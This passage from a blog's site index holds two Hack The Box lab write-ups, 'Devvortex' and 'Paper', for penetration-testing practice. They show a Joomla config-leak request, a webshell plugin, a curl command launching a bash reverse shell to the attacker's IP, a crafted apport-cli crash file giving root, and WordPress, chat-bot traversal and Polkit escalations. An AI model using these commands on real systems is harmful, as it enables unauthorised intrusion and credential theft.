&quot;HOST: FUZZ.devvortex.htb&quot; -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -fs <span class="hljs-number">154</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/subdomains.png"></p><p>I discovered the <code>dev</code> subdomain during the enumeration and added it to <code>/etc/hosts</code></p><p><img src="/img/devvortexpic/webpage.png"></p><p><img src="/img/devvortexpic/devwebpage.png"></p><p>I then used Dirsearch to enumerate directories on <code>http://dev.devvortex.htb</code> :</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//dev.devvortex.htb</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/dirsearch.png"></p><p>Accessing the <code>/administrator/</code> endpoint revealed a Joomla! Administrator login panel. This confirms that the site is built on Joomla, a widely-used CMS with a known history of vulnerabilities — especially if outdated.</p><p><img src="/img/devvortexpic/login.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access:"></a>Initial Access:</h1><p>While examining Joomla’s documentation and deployment structure, I discovered that the version number is exposed at: <code>/administrator/manifests/files/joomla.xml</code> ,which tells us its running joomla version <strong>Joomla 4.2.6</strong>:</p><p><img src="/img/devvortexpic/joomla_ver.png"></p><p>This version is affected by CVE-2023-23752, an unauthenticated information disclosure vulnerability. It allows attackers to retrieve sensitive configuration information such as database credentials, mail server settings, and API keys through a crafted request:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">curl -v <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/dev.devvortex.htb/api</span><span class="hljs-regexp">/index.php/v</span>1/config/application?<span class="hljs-keyword">public</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/jexploit.png"></p><p>Upon attempting to use these credentials in the Joomla login page, we are able to successfully log in as <code>lewis</code> :</p><p><img src="/img/devvortexpic/admin.png"></p><p>While researching methods to add RCE (Remote Code Execution) to a CMS, I came across this <a href="https://github.com/p0dalirius/Joomla-webshell-plugin">exploit</a> ,which allows an attacker to execute arbitrary code on the Joomla server. </p><p>I cloned the repository and installed the exploit onto the website via the Joomla administrator dashboard. To do this, I navigated to <strong>System &gt; Install - Extensions &gt; Upload Package File</strong>, and uploaded the <code>dist/joomla-webshell-plugin-1.1.0.zip</code> file. Joomla confirmed that the extension was installed successfully. After installation, I proceeded to test the plugin:</p><p><img src="/img/devvortexpic/upload.png"></p><p>To gain a reverse shell, I leveraged the webshell by sending a POST request to its endpoint using <code>curl</code>. The payload executes a bash reverse shell connecting back to my machine on port 4444:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl -X POST <span class="hljs-string">&#x27;http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php&#x27;</span> \<br>--data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;action=exec&quot;</span> \<br>--data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;cmd=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.49/4444 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>And upon executing the command, I successfully received a reverse shell: </p><p><img src="/img/devvortexpic/revshell.png"></p><p>While browsing through the server files, I came across <code>configuration.php</code>. This file contains the MySQL credentials used by Joomla for database access.</p><p><img src="/img/devvortexpic/configuration.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -h localhost -u lewis -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p>After logging in successfully, I listed the tables and identified one of interest:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> sd4fg_users;<br></code></pre></td></tr></table></figure><p>In the results, I found a user named <code>logan</code> along with a hashed password:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">logan : <span class="hljs-variable">$2y</span><span class="hljs-variable">$10</span><span class="hljs-variable">$IT4k5kmSGvHSO9d6M</span><span class="hljs-regexp">/1w0eYiB5Ne9XzArQRFJTGThNiy/y</span>BtkIj12<br></code></pre></td></tr></table></figure><p>I saved the bcrypt hash to a file and used <code>john</code> with the <code>rockyou.txt</code> wordlist to attempt cracking it:</p><p><img src="/img/devvortexpic/crackpass.png"></p><p>Now we can ssh with that password to user logan and retrieve user.txt flag:</p><p><img src="/img/devvortexpic/ssh.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation:"></a>Privilege Escalation:</h1><p>During post-exploitation enumeration, it was discovered that the user <code>logan</code> has <code>sudo</code> permissions to run the binary <code>/usr/bin/apport-cli</code> without providing a password:</p><p><img src="/img/devvortexpic/sudo.png"></p><p><code>apport-cli</code> is a command-line interface to the Apport crash-reporting system used in Ubuntu. It is written in Python and is capable of parsing <code>.crash</code> files that include Python-specific metadata.<br>The approach involves crafting a <strong>malicious <code>.crash</code> file</strong> that injects arbitrary Python code. When <code>apport-cli</code> parses this file, it can potentially execute our payload with root privileges.</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">cat <span class="hljs-operator">&lt;</span><span class="hljs-operator">&lt;</span>EOF <span class="hljs-operator">&gt;</span> <span class="hljs-symbol">/tmp/rootme.crash</span><br><span class="hljs-params">ProblemType:</span> Crash<br><span class="hljs-params">Architecture:</span> amd64<br><span class="hljs-params">DistroRelease:</span> Ubuntu<br><span class="hljs-params">Package:</span> exploit<br><span class="hljs-params">ExecutablePath:</span> <span class="hljs-symbol">/bin/bash</span><br><span class="hljs-params">ProcCmdline:</span> <span class="hljs-symbol">/bin/bash</span><br><span class="hljs-params">PythonArgs:</span> [&#x27;-c&#x27;, &#x27;<span class="hljs-built_in">import</span> os; os.setuid(<span class="hljs-number">0</span>); os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;]<br>EOF<br></code></pre></td></tr></table></figure><p><strong>Explanation</strong>:</p><ul><li>The <code>PythonArgs</code> field is injected with a payload that spawns a root shell using Python’s <code>os.setuid(0)</code> and <code>os.system(&quot;/bin/bash&quot;)</code>.</li></ul><p>With the malicious file in place, we trigger the binary using the following command:</p><p><img src="/img/devvortexpic/runcmd.png"></p><p>Upon pressing <code>V</code>, the shell executes with the <code>!/bin/bash</code> command, effectively launching a <strong>root shell</strong>:</p><p><img src="/img/devvortexpic/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :))"></a>Thanks For Reading :))</h2><p><img src="/img/devvortexpic/totoro.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Paper</title>
    <link href="/2025/04/20/HTB-Paper/"/>
    <url>/2025/04/20/HTB-Paper/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/paper-htb/paperhtb.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>We start by scanning ports:</p><p><img src="/img/paper-htb/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong> </li><li><strong>443 (HTTPS)</strong></li></ul><p> Add :  paper.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p> <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.143</span>    paper.htb<br></code></pre></td></tr></table></figure><p>Port 80 show a website:</p><p><img src="/img/paper-htb/website-http.png"></p><p>After conducting some initial enumeration, I did not discover any particularly interesting files or directories. However, I noticed a response header named <code>X-Backend-Server</code> which revealed a domain: <code>office.paper</code></p><p><img src="/img/paper-htb/curl.png"></p><p>We add it into our hosts file:</p><p><img src="/img/paper-htb/hosts.png"></p><h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>After visiting the website we see multiple posts, and we also see in the footer that it is a WordPress site.</p><p><img src="/img/paper-htb/office-paper.png"></p><p>A review of the page’s source code revealed that the application is using WordPress version 5.2.3 (alternatively, we could use WPScan to enumerate and confirm the version).</p><p><img src="/img/paper-htb/wordpress.png"></p><p>Upon reviewing the WordPress 5.2.3 version and its known vulnerabilities, we identified CVE-2019-17671, which allows viewing private posts or drafts without proper authorization. The following PoC illustrates this issue.</p><p><a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/</a></p><p><img src="/img/paper-htb/wordpress-exploit.png"></p><p>According to the vulnerability details, it’s possible to leak the content of private posts or drafts by appending <code>?static=1</code> to the URL.</p><p><img src="/img/paper-htb/static.png"></p><p>Discovered a new subdomain: <code>chat.office.paper</code>:</p><p><img src="/img/paper-htb/hidden-url.png"></p><p>We add it into our hosts file:</p><p><img src="/img/paper-htb/newhost.png"></p><h2 id="Rocket-chat"><a href="#Rocket-chat" class="headerlink" title="Rocket.chat:"></a>Rocket.chat:</h2><p>The registration URL takes us to the chat system <code>rocket.chat</code>.</p><p><img src="/img/paper-htb/rocket-chat.png"></p><p>After entering we see the only channel, <strong>#general</strong>.<br>Within the channel, multiple messages were visible, some of which mentioned a bot and listed the commands it accepts. Based on this, we initiated a conversation with the bot to further explore its functionality.</p><p><img src="/img/paper-htb/general.png"><br>We sent the <code>help</code> command to the bot, which returned a list of available commands. Among them, two stood out as particularly interesting: <code>file</code> and <code>list</code>.<br><img src="/img/paper-htb/help-bot.png"></p><p><img src="/img/paper-htb/list-cmd.png"></p><p>We perform an enumeration of files within the directory using <code>../</code>we see multiple directories&#x2F;files in <code>home/dwight</code>.</p><p><img src="/img/paper-htb/homedir.png"></p><p>Inside the <code>hubot/</code> directory, we found configuration files and the bot’s source code. Notably, the <code>.env</code> file contained the bot’s configuration details, including credentials.</p><p><img src="/img/paper-htb/config.png"></p><p>We use the password via SSH with the user <code>dwight</code>, we manage to obtain a shell and the flag <code>user.txt</code>.</p><p><img src="/img/paper-htb/ssh.png"></p><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation:"></a>Privilege escalation:</h2><p>It’s time to escalate our privileges to the root user. To begin, we need to enumerate the system for further information. After downloading <code>linpeas.sh</code>, the script revealed that the system is vulnerable to CVE-2021-3560.</p><p><img src="/img/paper-htb/cvepriv.png"></p><p>According to this <a href="https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/">GitHub blog post</a>, CVE-2021-3560 is a vulnerability in PolKit (PolicyKit), a system service used to manage permissions. The flaw allows an attacker with limited access to gain root privileges. By exploiting this vulnerability, the attacker can trick the system into creating a new superuser account or escalating their own privileges to root, bypassing security restrictions that would normally prevent this.</p><p>To exploit this vulnerability, we will use a script that automates the process. The script, available on <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">GitHub</a></p><p>After downloading the script from GitHub, we used <code>wget</code> to send it to the target system, where it could be executed to exploit the vulnerability.</p><p><img src="/img/paper-htb/exploit.png"></p><p><img src="/img/paper-htb/sendexploit.png"></p><p>We ran the script, and the execution was successful:</p><p><img src="/img/paper-htb/runexploit.png"></p><p>We switched the user to <code>secnigma</code> by exploiting the Polkit vulnerability and then ran <code>sudo bash</code>, which granted us a root shell</p><p><img src="/img/paper-htb/secnigma.png"></p><p>Finally, we accessed and retrieved the root flag.</p><p><img src="/img/paper-htb/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :))"></a>Thanks For Reading :))</h2><p><img src="/img/paper-htb/Ghibli3.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
